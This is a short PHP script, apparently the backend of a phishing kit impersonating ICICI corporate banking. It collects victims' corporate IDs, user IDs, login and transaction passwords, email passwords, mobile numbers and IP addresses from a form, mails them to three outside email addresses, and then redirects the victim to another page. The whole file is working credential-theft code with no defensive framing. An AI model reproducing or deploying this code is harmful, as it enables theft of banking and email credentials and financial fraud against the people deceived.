<?
$ip = getenv("REMOTE_ADDR");
$message .= "---Created By Silent Warrior---\n";
$message .= "Corporate ID  : ".$_POST['corp']."\n";
$message .= "User ID : ".$_POST['user']."\n";
$message .= "Password: ".$_POST['pass1']."\n";
$message .= "Transaction Password: ".$_POST['pass2']."\n";
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "Email Password: ".$_POST['emailpass']."\n";
$message .= "Mobile : ".$_POST['mobile']."\n";
$message .= "IP: ".$ip."\n";
$recipient = "ricksmithnig45@yahoo.co.jp, jameskumarpvtltd@gmail.com, anandshreepvtltd@gmail.com";
$subject = " IIIIIIIINDIA ICICI CORPORATE: ".$ip."\n";
$headers = "MIME-Version: 1.0\n";
if (mail($recipient,$subject,$message,$headers))
	   {header("Location: grid.html");
}
else
{echo "ERROR! Please go back and try again.";
}?>